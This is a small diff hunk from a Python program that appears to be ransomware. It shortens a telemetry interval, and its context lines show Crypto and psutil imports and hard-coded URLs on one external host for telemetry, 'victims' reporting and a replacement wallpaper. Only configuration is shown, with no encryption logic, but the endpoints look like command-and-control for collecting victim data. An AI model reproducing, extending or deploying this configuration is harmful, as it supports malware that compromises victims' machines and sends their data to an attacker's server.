@@ -21,8 +21,7 @@ from Crypto import Random
 
 import psutil
 
-# --- Configuration ---
-TELEMETRY_INTERVAL = 30
+TELEMETRY_INTERVAL = 5
 TELEMETRY_URL = "https://minecraft.puiustin.com/api/telemetry"
 VICTIM_URL = "https://minecraft.puiustin.com/api/victims"
 WALLPAPER_URL = "https://minecraft.puiustin.com/background.jpeg"
